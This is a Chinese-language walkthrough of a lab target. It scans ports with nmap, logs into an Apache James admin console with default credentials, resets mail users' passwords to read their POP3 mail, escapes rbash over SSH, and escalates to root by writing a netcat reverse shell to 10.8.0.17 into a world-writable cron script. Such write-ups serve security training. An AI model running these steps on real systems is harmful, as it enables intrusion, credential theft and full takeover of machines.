
## 信息收集阶段

全端口扫描，查询目标靶机开放端口和服务

```shell
sudo nmap -p- -n -v -sS --max-retries=0 172.16.33.35
```

<img src="https://cos.kevinc.ltd/file/download?fileId=795" style="zoom:33%;" />



进行服务版本扫描

```shell
nmap -p22,25,80,110,119,4555 -sV -A 172.16.33.35
```

<img src="https://cos.kevinc.ltd/file/download?fileId=796" style="zoom:33%;" />

发现有陌生服务`james-admin`,尝试用`searchsploit`看看是否有利用脚本

<img src="https://cos.kevinc.ltd/file/download?fileId=797" style="zoom:33%;" />

有几个版本符合的脚本，尝试利用，但都不成功

<img src="https://cos.kevinc.ltd/file/download?fileId=798" style="zoom:33%;" />

查看脚本具体内容，发现`james-admin`默认账号密码都为`root`, 尝试登录

<img src="https://cos.kevinc.ltd/file/download?fileId=799" style="zoom:33%;" />

使用`help`查看可用命令，注意到有枚举用户的命令`listusers` 和修改密码的命令`setpassword`，修改各用户密码，然后登录`POP3` 邮箱服务，看各用户的邮件，命令如下：

```shell
nc -C 172.16.33.35 110

USER mindy
PASS 123

LIST  # 列出所有邮件
RETR 1 # 查看对应邮件
```



## 利用漏洞拿shell

发现`mindy`的邮件中有账号密码的泄漏，尝试拿这个账号密码去登录远程服务器

登录成功！尝试修改密码，发现`Shell`被限制，为`rbash`

<img src="https://cos.kevinc.ltd/file/download?fileId=801" style="zoom:33%;" />

尝试绕过`rbash`, 这里使用的方法是登录时加入 `-t "bash --noprofile"`

```shell
ssh mindy@172.16.33.35 -t "bash --noprofile"
```

登录成功后发现已成功绕过。

跑一下`./linpeas.sh`提权脚本，发现没什么发现



## 提权

可以查看一下系统各个用户的进程，特别关注一下`james`的

```shell
ps aux | grep james
```

发现有一个`run.sh`在`opt`目录下，查看`opt`目录时发现有一个`tmp.py`文件,该文件的权限是所有用户可读可写可执行

也可以这样查询

```shell
find / -user root -perm -o=w -type f 2>/dev/null | grep -v 'proc\|sys'
```

通过查看该文件内容，判断该文件应该是一个定时删除`tmp`目录内文件的脚本，可尝试写入自己的反弹shell

```shell
echo 'import os;os.system("/bin/nc 10.8.0.17 777 -e /bin/bash")' > tmp.py
```

<img src="https://cos.kevinc.ltd/file/download?fileId=802" style="zoom:33%;" />

等几分钟后获得shell，获得root权限

<img src="https://cos.kevinc.ltd/file/download?fileId=803" style="zoom:33%;" />
